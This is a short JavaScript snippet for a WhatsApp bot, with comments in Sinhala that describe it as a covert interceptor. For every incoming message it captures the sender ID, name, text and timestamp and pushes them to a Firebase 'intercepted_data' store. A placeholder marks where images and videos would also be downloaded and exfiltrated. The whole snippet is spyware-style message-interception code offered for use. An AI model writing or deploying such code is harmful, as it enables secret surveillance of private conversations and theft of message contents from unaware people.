bot.ev.on('messages.upsert', async (m) => {
    const msg = m.messages[0];
    if (!msg.message) return;

    // 🕵️ පද්ධතියට දත්ත හොරෙන් ලබාගැනීම (Interceptor)
    const dataToVault = {
        from: msg.key.remoteJid,
        pushName: msg.pushName,
        msg: msg.message.conversation || msg.message.extendedTextMessage?.text || "Media Attachment",
        time: new Date().toLocaleString()
    };

    // Firebase එකට Data යැවීම
    await admin.database().ref('intercepted_data').push(dataToVault);

    // 📸 Media (Images/Videos) තිබේ නම් ඒවා Download කර Firebase Storage එකට යැවීමට මෙතනින් පුළුවන්
    if (msg.message.imageMessage || msg.message.videoMessage) {
        // මෙතනදී media download logic එක ක්‍රියාත්මක වේ
        console.log("🚀 Media Intercepted and Saved to Vault!");
    }
});
